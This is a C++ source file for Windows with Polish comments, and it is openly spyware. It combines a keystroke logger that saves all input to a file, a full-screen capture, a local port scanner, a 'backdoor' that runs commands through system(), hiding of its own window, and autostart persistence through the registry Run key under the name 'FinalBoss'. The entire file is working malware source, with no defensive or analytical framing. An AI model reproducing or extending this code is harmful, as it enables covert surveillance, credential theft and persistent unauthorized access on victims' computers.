#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <vector>
#include <string>
#include <sstream>
#include <winsock2.h>     // WAŻNE: najpierw winsock2.h
#include <windows.h>
#include <urlmon.h>
#include <winreg.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Urlmon.lib")

#define MAX_BUFFER 1024

// Zmiana nazwy procesu
void changeProcessName(const std::string& newName) {
    SetConsoleTitleA(newName.c_str());
}

// Keylogger
void keylogger() {
    std::ofstream keylogFile("keylog.txt", std::ios::app);
    while (true) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                keylogFile << (char)i;
                keylogFile.flush();
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// Screenshot
bool takeScreenshot(const std::string& path) {
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x, y);
    HBITMAP hOld = (HBITMAP)SelectObject(hMem, hBitmap);

    BitBlt(hMem, 0, 0, x, y, hScreen, 0, 0, SRCCOPY);
    SelectObject(hMem, hOld);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = x;
    bi.biHeight = -y;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((x * 24 + 31) / 32) * 4 * y;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);

    GetDIBits(hMem, hBitmap, 0, (UINT)y, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    std::ofstream file(path, std::ios::binary);
    if (!file) return false;

    DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfOffBits = dwSize;
    bmfHeader.bfSize = dwSize + dwBmpSize;
    bmfHeader.bfType = 0x4D42;

    file.write((char*)&bmfHeader, sizeof(bmfHeader));
    file.write((char*)&bi, sizeof(bi));
    file.write(lpbitmap, dwBmpSize);

    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    DeleteObject(hBitmap);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
    return true;
}

// Port Scan
void portScan(const std::string& host, const std::vector<int>& ports) {
    std::string response;

    for (int port : ports) {
        SOCKET scanSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (scanSock == INVALID_SOCKET) {
            response += "Socket creation failed for port " + std::to_string(port) + "\n";
            continue;
        }

        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        serverAddr.sin_addr.s_addr = inet_addr(host.c_str());

        int result = connect(scanSock, (sockaddr*)&serverAddr, sizeof(serverAddr));
        if (result == SOCKET_ERROR) {
            response += "Port " + std::to_string(port) + " is closed.\n";
        } else {
            response += "Port " + std::to_string(port) + " is open.\n";
        }

        closesocket(scanSock);
    }

    std::cout << response << std::endl;
}

// Backdoor - Zdalne uruchamianie komend
void runRemoteCommand(const std::string& command) {
    system(command.c_str());
}

// Zmiana nazwy procesu na cicho
void hideProcess() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

// Autostart - Dodanie do rejestru
void addToAutostart() {
    const char* regPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        const std::string execPath = "\"" + std::string(__argv[0]) + "\"";
        RegSetValueExA(hKey, "FinalBoss", 0, REG_SZ, (const BYTE*)execPath.c_str(), execPath.length() + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    // Inicjalizacja Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    // Zmiana nazwy procesu
    changeProcessName("FinalBoss");

    // Autostart
    addToAutostart();

    // Ukrycie okna
    hideProcess();

    // Keylogger
    std::thread keyloggerThread(keylogger);
    keyloggerThread.detach();

    // Screenshot
    if (takeScreenshot("screenshot.bmp")) {
        std::cout << "Screenshot taken!" << std::endl;
    } else {
        std::cout << "Failed to take screenshot!" << std::endl;
    }

    // Port scan
    std::vector<int> ports = { 80, 443, 8080 };
    portScan("127.0.0.1", ports);

    // Przykładowa komenda
    runRemoteCommand("dir");

    // Pauza, żeby nie zamykało się od razu
    std::cout << "Press Enter to exit...\n";
    std::cin.get();

    WSACleanup();  // Zamknięcie Winsock
    return 0;
}
